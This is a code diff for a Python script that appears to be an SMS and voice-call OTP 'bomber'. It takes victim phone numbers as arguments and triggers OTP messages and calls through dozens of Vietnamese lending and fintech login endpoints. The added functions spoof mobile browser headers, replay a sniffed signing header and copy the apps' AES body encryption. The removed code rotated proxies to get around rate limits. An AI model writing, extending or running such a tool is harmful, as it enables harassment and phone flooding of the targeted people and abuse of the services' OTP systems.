-    async def _try(proxy_url):
-        if stop_event.is_set():
-            return False, proxy_url, "Stopped"
-        async with sem:
-            if stop_event.is_set():
-                return False, proxy_url, "Stopped"
-            return await fn(phone_otp, proxy_url)
-    tasks = [asyncio.create_task(_try(p)) for p in sample]
-    try:
-        for coro in asyncio.as_completed(tasks):
-            try:
-                ok, proxy, msg = await coro
-            except asyncio.CancelledError:
-                continue
-            except Exception:
-                continue
-            if ok:
-                success += 1
-                print(f"[✅ Success #{success} via {proxy} | {msg}")
-            if success >= target:
-                stop_event.set()
-                for t in tasks:
-                    if not t.done():
-                        t.cancel()
-                break
-    finally:
-        await asyncio.gather(*tasks, return_exceptions=True)
-        tasks.clear()
-        gc.collect()
-    return success
+    def aes_encrypt(payload):
+        raw = json.dumps(payload, separators=(",", ":")).encode()
+        cipher = AES.new(KEY, AES.MODE_CBC, IV)
+        encrypted = cipher.encrypt(pad(raw, AES.block_size))
+        return base64.b64encode(encrypted).decode()
+
+    mobile = "84" + phone_otp.lstrip("0")
+    payload = {
+        "phone": mobile,
+        "isVoice": False,
+        "h5": False,
+        "deviceId": ""
+    }
+
+    body = aes_encrypt(payload)
+
+    headers = {
+        "fpPlatform": "5",
+        "appId": "20",
+        "language": "vi-VN",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "Referer": "https://h5.6itake-moment.com/login",
+        "country": "undefined",
+        "Origin": "https://h5.6itake-moment.com",
+        "Sec-Fetch-Dest": "empty",
+        "fpDeviceId": "",
+        "version": "1.0.0_4.0.4",
+        "Sec-Fetch-Site": "same-origin",
+        "fingerPrint": "",
+        "deviceId": "",
+        "platform": "2",
+        "token": "undefined",
+        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
+        "loginPlatform": "H5",
+        "marketToken": "undefined",
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Sec-Fetch-Mode": "cors",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+    }
+
+    async with httpx.AsyncClient(timeout=30) as client:
+        r = await client.post(
+            "https://h5.6itake-moment.com/h5/3tcobpsevujcfu4ga4qpdeaddh0gdhd4",
+            headers=headers,
+            data=body,
+        )
+
+        print("STATUS:", r.status_code)
 
 async def main():
     phone_otps = sys.argv[1:11]
     if not phone_otps:
-        print("Usage: python pro.py <phone_otp1> [phone_otp2] ...")
+        print("Usage: python main.py <phone_otp1> [phone_otp2] ...")
         sys.exit(1)
-    proxies = load_proxies()
-    proxy_sleep = max(1, 11 - 1 * len(phone_otps))
-
-    def proxy(fn):
-        async def wrapper(phone_otp):
-            await run_proxy_async(fn, phone_otp, proxies, workers=100, batch=200, target=2)
-        wrapper.__name__ = fn.__name__
-        return wrapper
-
     all_funcs = [
-        # (vncredit_sms,     0),
-        # (call_vaydep365,   10),        
-        # (qq_sms,           10),
-        # (call_mfast360,    10),
-        # (proxy(vuiapp),    proxy_sleep),        
-        # (calll20,          10),
-        # (mfast,            0),
-        # (call101,          0),
-        # (call3,            0),
-        # (call10ok,         10),
-        # (ptvay_sms,        10),        
-         (call_senvay,        0),        
-        # (call,             0),
-        # (vncredit_voice,   10),        
-        # (combo2,           10),        
-        # (mfast1,           10),
-        # (calll18,          10),
-        # (call1,            10),
-        # (combo1,           10), 
-        # (call14ok,         10),
-        # (achau_sms,        10),
-        # (calll11ok,        10),
-        # (petro_sms,        10),        
-        # (call_mydong,      10),
-        # (calll_mydong,     10),        
-        # (lavi_sms,         10),        
-        # (call28,           10),
-        # (proxy(vuiapp1),   proxy_sleep),        
-        # (call8,            10),
-        # (call9,            10),
-        # (call11,           10),
-        # (call12,           10),
-        # (random_site,       0),   
-        # (calll,             0),
-        # (calll12,          10),
-        # (calll_mydong,     10),
-        # (call14ok,         10),
-        # (call10,           10),
-        # (call_subkamol,    10),        
-        # (calll11,          10),
-        # (call11ok,         10),
-        # (call18,           10),
-        # (call12ok,         10),
-        # (calll28,          10),
-        # (call13ok,         10),
-        # (calll14ok,        10),
-        # (call17,           10),
-        # (proxy(vuiapp2),   proxy_sleep),
-        # (calll22,          10),
-        # (calll19,          10),
-        # (call19,           10),
-        # (calll17,          10),
-        # (call21,           10),
-        # (calll10ok,        10),
-        # (call22,           10),
-        # (calll_subkamol,   10),
+        (itake,              30),
+        (vay24h,             15),
+        (htc_sms,            20),
+        (vncredit_sms,       0),
+        (call_mfast360,      20),
+        (call_vaydep365,     15),
+        (qq_sms,             15),
+        (call2,              15),
+        (mfast,              15),
+        (lavi_sms,           15),
+        (call13,             15),
+        (call3,              15),
+        (ptvay_sms,          15),
+        (call_senvay,        20),
+        (call_hoivan,        10),
+        (vncredit_voice,     15),
+        (call21,             15),
+        (combo2,             15),
+        (uvwallet,           15),
+        (call1,              15),
+        (combo1,             15),
+        (achau_sms,          15),
+        (call14_okay,         15),
+        (petro_sms,          15),
+        (call_mydong,        15),
+        (call_mydong_okay,    15),
+        (call20,             15),
+        (call8,              15),
+        (call9,              15),
+        (call11,             15),
+        (call12,             15),
+        (random_site,        0),
+        (call_hoivan_okay,    10),
+        (call12_okay,         15),
+        (call14,             15),
+        (call10,             15),
+        (call19,             15),
+        (call11_okay,         15),
+        (call18,             15),
+        (call15,             15),
+        (call20_okay,         15),
+        (call16,             15),
+        (call22_okay,         15),
+        (call19_okay,         15),
+        (call17,             15),
+        (call23,             15),
+        (call22,             15),
+        (call21_okay,         15),
+        (call13_okay,         15),
+        (call18_okay,         15),
+        (call10_okay,         15),
+        (call17_okay,         15),
+        (call_vvay,          15),
+        (calll_vvay,         15),
     ]
     async def safe_call(func, phone_otp):
+        name = fn.__name__
         try:
-            await func(phone_otp)
-        except:
-            pass
+            await fn(phone_otp)
+            print(f" 📡 {name} {phone_otp} ✅ ")
+        except Exception as e:
+            print(f" ✘ {name} lỗi: {e}")
 
     for f_idx, (func, sleep_time) in enumerate(all_funcs, 1):
         await asyncio.gather(*[safe_call(func, phone_otp) for phone_otp in phone_otps])
         if f_idx < len(all_funcs):
-            await asyncio.sleep(random.uniform(sleep_time, sleep_time + 3) if sleep_time > 0 else 0)
+            delay = random.uniform(sleep_time, sleep_time + 3)
+            print(f"[{func.__name__}] vòng {f_idx} nghỉ {delay:.2f}s")
+            await asyncio.sleep(delay)
+
+async def call_vvay(phone_otp: str):
+    """
+    V-Vay OTP — POST /h5/adrs7vc167lsu00n79ms98o0r4t1bqm5
+    Body của app gốc được AES-encrypt (key nằm trong app JS).
+    Gửi JSON plaintext — server H5 thường accept cả hai mode.
+    x_x_path: HMAC-SHA256 của path, static từ sniff (32 bytes base64).
+    """
+    headers = {
+        "Host": "h5api.v-vay.com",
+        "fpPlatform": "5",
+        "appId": "4",
+        "language": "vi-VN",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "Referer": "https://h5api.v-vay.com/login",
+        "country": "VN",
+        "Origin": "https://h5api.v-vay.com",
+        "Sec-Fetch-Dest": "empty",
+        "fpDeviceId": str(uuid.uuid4()),
+        "version": "1.0.0_4.0.6",
+        "Sec-Fetch-Site": "same-origin",
+        "fingerPrint": "",
+        "Content-Type": "application/json",
+        "platform": "2",
+        "token": "",
+        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
+        "loginPlatform": "H5",
+        "marketToken": "",
+        "Accept": "application/json",
+        "Sec-Fetch-Mode": "cors",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+        "deviceId": str(uuid.uuid4()).replace("-", ""),
+    }
+    payload = {
+        "phone": phone_otp,
+        "type": 1,
+    }
+    try:
+        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
+            r = await client.post(
+                "https://h5api.v-vay.com/h5/adrs7vc167lsu00n79ms98o0r4t1bqm5",
+                json=payload,
+                headers=headers,
+            )
+        if r.status_code == 200:
+            print(f"✅ call_vvay | {phone_otp} | {r.status_code} | {r.text[:120]}")
+    except Exception:
+        pass
+
+async def calll_vvay(phone_otp: str):
+    """V-Vay OTP type 2 (voice/call variant)."""
+    headers = {
+        "Host": "h5api.v-vay.com",
+        "fpPlatform": "5",
+        "appId": "4",
+        "language": "vi-VN",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+        "Referer": "https://h5api.v-vay.com/login",
+        "country": "VN",
+        "Origin": "https://h5api.v-vay.com",
+        "Sec-Fetch-Dest": "empty",
+        "fpDeviceId": str(uuid.uuid4()),
+        "version": "1.0.0_4.0.6",
+        "Sec-Fetch-Site": "same-origin",
+        "fingerPrint": "",
+        "Content-Type": "application/json",
+        "platform": "2",
+        "token": "",
+        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
+        "loginPlatform": "H5",
+        "marketToken": "",
+        "Accept": "application/json",
+        "Sec-Fetch-Mode": "cors",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+        "deviceId": str(uuid.uuid4()).replace("-", ""),
+    }
+    payload = {
+        "phone": phone_otp,
+        "type": 2,
+    }
+    try:
+        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
+            r = await client.post(
+                "https://h5api.v-vay.com/h5/adrs7vc167lsu00n79ms98o0r4t1bqm5",
+                json=payload,
+                headers=headers,
+            )
+        if r.status_code == 200:
+            print(f"✅ calll_vvay | {phone_otp} | {r.status_code} | {r.text[:120]}")
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     asyncio.run(main())
